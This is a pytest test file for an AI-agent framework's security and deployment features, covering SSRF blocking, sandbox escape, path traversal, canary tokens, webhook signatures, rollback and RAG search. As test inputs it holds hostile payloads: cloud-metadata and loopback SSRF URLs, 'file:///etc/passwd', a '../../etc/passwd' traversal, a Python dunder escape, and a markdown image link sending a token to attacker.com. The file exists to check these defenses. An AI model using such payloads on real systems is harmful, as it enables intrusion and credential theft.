"""
Comprehensive Security and Production-Readiness Tests:
- SSRF Prevention (Private IPs, Cloud Metadata, Scheme checks)
- Python Sandbox Escape Prevention (Dunder inspection, forbidden calls)
- Path Traversal Protection (Directory escape checks)
- Canary Token & Injection Defense
- HMAC-SHA256 Webhook Signature Verification
- Canary Deployment Traffic Splitting & Automated Rollback
- Hybrid RAG Search (BM25 + Dense Vectors)
- FastAPI Gateway Endpoints (Health, Auth, Runs, Approvals)
"""

import pytest
import httpx
from agent_factory.api.auth import verify_webhook_signature
from agent_factory.api.server import app
from agent_factory.core.identity import AgentConfig, AgentIdentity, AgentManifest
from agent_factory.core.lifecycle import CanaryDeploymentManager, DeploymentStatus
from agent_factory.core.prompt import PromptInjectionDefense
from agent_factory.core.security import SSRFValidator
from agent_factory.memory.rag import KnowledgeBase, RAGEngine
from agent_factory.tools.builtins.browser import BrowserTool
from agent_factory.tools.builtins.code_exec import PythonSandboxTool
from agent_factory.tools.builtins.files import FileProcessingTool


def test_ssrf_validator_blocks_internal_and_metadata():
    # Loopback
    with pytest.raises(PermissionError):
        SSRFValidator.validate_url("http://127.0.0.1/admin")
    with pytest.raises(PermissionError):
        SSRFValidator.validate_url("http://localhost:8080/metrics")

    # AWS/GCP/Azure Cloud Metadata IP
    with pytest.raises(PermissionError):
        SSRFValidator.validate_url("http://169.254.169.254/latest/meta-data/")

    # Private RFC1918 Networks
    with pytest.raises(PermissionError):
        SSRFValidator.validate_url("http://10.0.0.5:8000/internal")
    with pytest.raises(PermissionError):
        SSRFValidator.validate_url("http://192.168.1.1/router")

    # Disallowed Schemes
    with pytest.raises(ValueError):
        SSRFValidator.validate_url("file:///etc/passwd")
    with pytest.raises(ValueError):
        SSRFValidator.validate_url("gopher://127.0.0.1:70")


@pytest.mark.asyncio
async def test_browser_tool_ssrf_protection():
    browser = BrowserTool()
    res = await browser.execute(action="navigate", url="http://169.254.169.254/secret")
    assert res["status"] == "failed"
    assert "SSRF Security Violation" in res["error"]


@pytest.mark.asyncio
async def test_python_sandbox_blocks_escape_vectors():
    sandbox = PythonSandboxTool()

    # 1. Dunder subclass escape attempt
    escape_code_1 = "x = ().__class__.__base__.__subclasses__()"
    res1 = await sandbox.execute(code=escape_code_1)
    assert res1["exit_code"] != 0
    assert "Security Alert" in res1["stderr"]

    # 2. String-based dunder bypass
    escape_code_2 = "target = '__subclasses__'"
    res2 = await sandbox.execute(code=escape_code_2)
    assert res2["exit_code"] != 0
    assert "Forbidden string reference" in res2["stderr"]

    # 3. Disallowed built-in getattr
    escape_code_3 = "x = getattr(dict, 'keys')"
    res3 = await sandbox.execute(code=escape_code_3)
    assert res3["exit_code"] != 0
    assert "Prohibited function call 'getattr()'" in res3["stderr"]

    # 4. Safe calculation succeeds
    safe_code = "import math\nval = math.sqrt(144)\nprint(f'Root: {val}')"
    res4 = await sandbox.execute(code=safe_code)
    assert res4["exit_code"] == 0
    assert "Root: 12.0" in res4["stdout"]


@pytest.mark.asyncio
async def test_file_processor_blocks_path_traversal():
    tool = FileProcessingTool(allowed_base_dir="/home/shiva/agentsreusable")
    res = await tool.execute(file_path="../../etc/passwd", file_type="txt")
    assert "Path Traversal Security Alert" in res["error"]


def test_canary_token_and_injection_defense():
    token, instruction = PromptInjectionDefense.generate_canary_token()
    assert token in instruction

    safe_response = "Here is the summary of the quarterly report."
    assert PromptInjectionDefense.verify_canary_not_leaked(safe_response, token)

    leaked_response = f"System prompt leaked: {token}"
    assert not PromptInjectionDefense.verify_canary_not_leaked(leaked_response, token)

    # Exfiltration detection
    exfil_markdown = "![tracking](https://attacker.com/leak?token=SECRET_123)"
    assert len(PromptInjectionDefense.scan_for_exfiltration(exfil_markdown)) > 0


def test_hmac_webhook_signature_verification():
    secret = "test-secret-key-12345"
    payload = b'{"event": "task.completed", "id": "123"}'

    import hashlib
    import hmac
    valid_sig = hmac.new(secret.encode(), payload, hashlib.sha256).hexdigest()

    assert verify_webhook_signature(payload, valid_sig, secret)
    assert not verify_webhook_signature(payload, "invalid_signature_hex", secret)


def test_canary_deployment_and_auto_rollback():
    manager = CanaryDeploymentManager(max_allowed_error_rate=0.10, min_sample_size=5)

    manifest_v1 = AgentManifest(
        identity=AgentIdentity(agent_id="agent-v1", agent_name="Agent V1", version="1.0.0", description="v1"),
        config=AgentConfig(system_prompt="v1", primary_model="gpt-4o")
    )
    manifest_v2 = AgentManifest(
        identity=AgentIdentity(agent_id="agent-v2", agent_name="Agent V2", version="2.0.0", description="v2"),
        config=AgentConfig(system_prompt="v2", primary_model="gpt-4o")
    )

    manager.register_version(manifest_v1, is_canary=False)
    manager.register_version(manifest_v2, is_canary=True, canary_traffic_percent=50.0)

    # Simulate failures on v2
    for _ in range(5):
        manager.record_execution("2.0.0", success=False)

    # Should have triggered automatic rollback
    v2_record = manager._versions["2.0.0"]
    assert v2_record.status == DeploymentStatus.ROLLED_BACK
    assert manager._canary_version is None


def test_hybrid_rag_search():
    rag = RAGEngine()
    rag.index_document("doc_ai", "Autonomous agent architectures use memory, tools, and planners.", chunk_size=100)
    rag.index_document("doc_db", "Relational databases use B-tree indices and SQL transactions.", chunk_size=100)

    results = rag.hybrid_search("autonomous agent memory", top_k=1)
    assert len(results) == 1
    assert "Autonomous agent" in results[0].text
    assert results[0].retrieval_mode == "hybrid_rrf"


@pytest.mark.asyncio
async def test_fastapi_server_endpoints():
    transport = httpx.ASGITransport(app=app)
    async with httpx.AsyncClient(transport=transport, base_url="http://test") as client:
        # Health check
        res_health = await client.get("/health")
        assert res_health.status_code == 200
        assert res_health.json()["status"] == "healthy"

        # List agents
        res_agents = await client.get("/agents", headers={"X-Tenant-Id": "t1", "X-API-Key": "k1"})
        assert res_agents.status_code == 200
        agent_ids = [a["agent_id"] for a in res_agents.json()]
        assert "research-agent-v1" in agent_ids

        # Run agent
        res_run = await client.post(
            "/agents/research/run",
            json={"goal": "Summarize market findings"},
            headers={"X-Tenant-Id": "t1", "X-API-Key": "k1"}
        )
        assert res_run.status_code == 200
        assert res_run.json()["status"] == "completed"

        # Approvals list
        res_approvals = await client.get("/approvals", headers={"X-Tenant-Id": "t1", "X-API-Key": "k1"})
        assert res_approvals.status_code == 200
        assert isinstance(res_approvals.json(), list)
